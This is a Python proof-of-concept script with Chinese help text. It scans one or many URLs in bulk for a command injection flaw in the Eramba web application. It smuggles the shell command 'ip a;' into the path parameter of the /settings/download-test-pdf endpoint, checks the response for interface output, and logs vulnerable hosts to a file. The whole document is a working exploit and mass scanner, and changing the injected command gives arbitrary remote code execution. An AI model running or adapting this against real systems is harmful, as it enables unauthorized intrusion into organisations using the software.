# Eramba代码执行漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
███████╗██████╗  █████╗ ███╗   ███╗██████╗  █████╗       ██████╗  ██████╗███████╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗      ██╔══██╗██╔════╝██╔════╝
█████╗  ██████╔╝███████║██╔████╔██║██████╔╝███████║█████╗██████╔╝██║     █████╗  
██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║╚════╝██╔══██╗██║     ██╔══╝  
███████╗██║  ██║██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║      ██║  ██║╚██████╗███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝      ╚═╝  ╚═╝ ╚═════╝╚══════╝

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='Eramba代码执行漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/settings/download-test-pdf?path=ip%20a;"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64;rv:109.0)Gecko/20100101Firefox/111.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding': 'gzip,deflate',
        'Referer': 'https://[redacted]/settings',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 500 and 'inet' in response.text:
            print(f"[+]{target} 存在代码执行漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在代码执行漏洞")
    except:
        print(f"[x]{target} 该站点无法访问")


if __name__ == '__main__':
    main()